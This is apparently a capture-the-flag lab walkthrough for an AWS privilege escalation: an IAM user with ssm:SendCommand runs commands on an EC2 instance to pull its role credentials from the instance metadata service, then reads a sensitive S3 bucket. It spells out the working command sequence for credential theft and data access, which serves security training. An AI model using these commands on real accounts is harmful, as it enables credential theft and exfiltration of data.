# Guided Walkthrough: One-Hop Privilege Escalation via ssm:SendCommand to S3 Bucket

This scenario demonstrates a privilege escalation vulnerability where an IAM user has permission to execute commands on EC2 instances via AWS Systems Manager (SSM) SendCommand. The attacker can execute arbitrary commands on an EC2 instance that has an IAM role with S3 bucket access permissions, extract the temporary credentials from the EC2 instance metadata service, and then use those credentials locally to access sensitive S3 buckets.

This attack vector is particularly dangerous because it combines the operational convenience of SSM (remote command execution without SSH/RDP access) with the common practice of attaching IAM roles with data access permissions to EC2 instances. Unlike SSH-based attacks, SSM access is often granted broadly across engineering teams for legitimate troubleshooting purposes, making this a realistic initial access vector.

The attack leaves minimal forensic evidence if SSM Session Manager logging is not properly configured, and the extracted credentials are time-limited but fully functional AWS credentials that can be used from any location to access sensitive data stores.

## The Challenge

You start as `pl-prod-ssm-002-to-bucket-starting-user` — an IAM user whose credentials you've obtained. The user has a single noteworthy permission: `ssm:SendCommand` on `*`. Your target is `pl-sensitive-data-ssm-002-{account_id}-{suffix}`, an S3 bucket containing sensitive data that your starting user cannot access directly.

Somewhere in this account there is an EC2 instance that CAN access that bucket. The instance has an IAM role attached via an instance profile that grants S3 read access. Your job is to bridge that gap: use SSM to execute commands on the instance, steal the temporary credentials it holds, and use them from your own machine to exfiltrate the sensitive data.

## Reconnaissance

First, confirm your identity and verify you do not already have access to the target bucket:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::123456789012:user/pl-prod-ssm-002-to-bucket-starting-user

aws s3 ls s3://pl-sensitive-data-ssm-002-123456789012-a3f9x2
# An error occurred (AccessDenied) -- good, as expected
```

Next, find the EC2 instance that has an IAM role attached. If you have `ec2:DescribeInstances`, this is straightforward:

```bash
aws ec2 describe-instances \
  --filters Name=instance-state-name,Values=running \
  --query 'Reservations[*].Instances[*].[InstanceId,IamInstanceProfile.Arn]' \
  --output table
```

Look for an instance that has an instance profile ARN in the output — that profile associates an IAM role with the instance, and that role is likely your stepping stone. Also confirm the SSM agent is online:

```bash
aws ssm describe-instance-information \
  --filters "Key=InstanceIds,Values=i-XXXXXXXXX" \
  --query 'InstanceInformationList[0].PingStatus' \
  --output text
# Online
```

## Exploitation

With the instance ID in hand, you're ready to exploit the path. The key insight is that every EC2 instance with an attached IAM role makes those role's temporary credentials available at a well-known HTTP endpoint inside the instance: the Instance Metadata Service (IMDS). Since you can run arbitrary shell commands on the instance via SSM, you can query that endpoint and capture the credentials.

Modern AWS instances use IMDSv2, which requires a session token. The two-step process is: first obtain a token via a `PUT` request, then use that token to query the credentials endpoint.

Send the SSM command to extract the credentials:

```bash
aws ssm send-command \
  --instance-ids "i-XXXXXXXXX" \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=[
    "TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" 2>/dev/null)",
    "curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/pl-prod-ssm-002-to-bucket-ec2-bucket-role 2>/dev/null"
  ]' \
  --query 'Command.CommandId' \
  --output text
# abc12345-0000-1111-2222-def67890abcd
```

Wait for the command to finish (typically 15-30 seconds), then retrieve the output:

```bash
aws ssm list-command-invocations \
  --command-id "abc12345-0000-1111-2222-def67890abcd" \
  --details \
  --query 'CommandInvocations[0].CommandPlugins[0].Output' \
  --output text
```

The output is a JSON blob containing `AccessKeyId`, `SecretAccessKey`, and `Token` — the temporary credentials for `pl-prod-ssm-002-to-bucket-ec2-bucket-role`.

Export those credentials into your local shell:

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
```

## Verification

Confirm you are now operating as the EC2 instance role:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:sts::123456789012:assumed-role/pl-prod-ssm-002-to-bucket-ec2-bucket-role/i-XXXXXXXXX
```

Now access the bucket that was previously denied:

```bash
aws s3 ls s3://pl-sensitive-data-ssm-002-123456789012-a3f9x2
# 2024-01-01 00:00:00       1234 sensitive-data.txt

aws s3 cp s3://pl-sensitive-data-ssm-002-123456789012-a3f9x2/sensitive-data.txt -
# [contents of sensitive data file]
```

## Capture the Flag

The target bucket contains a `flag.txt` object placed there by Terraform. Once you have the EC2 instance role credentials, read it directly with:

```bash
aws s3 cp s3://$BUCKET_NAME/flag.txt -
```

For example:

```bash
aws s3 cp s3://pl-sensitive-data-ssm-002-123456789012-a3f9x2/flag.txt -
# FLAG{...}
```

This confirms you have fully achieved the objective: you extracted credentials from the EC2 instance via SSM and used them to read data from the sensitive bucket that was inaccessible to your starting user.

## What Happened

You exploited a one-hop privilege escalation path: your starting user had `ssm:SendCommand` on all EC2 instances, and one of those instances had an IAM role with S3 access. By sending a shell command via SSM, you reached inside the instance and extracted its temporary AWS credentials from the Instance Metadata Service. Those credentials, once exported locally, gave you the same S3 permissions as if you were the instance itself.

This is a realistic and common misconfiguration. Engineering teams routinely grant `ssm:SendCommand` broadly for troubleshooting, and EC2 instances routinely carry IAM roles with data access. The combination creates an unintended privilege escalation path that bypasses S3 bucket policies and IAM boundaries — an attacker who compromises one low-privilege user can reach sensitive data stores they were never supposed to touch.
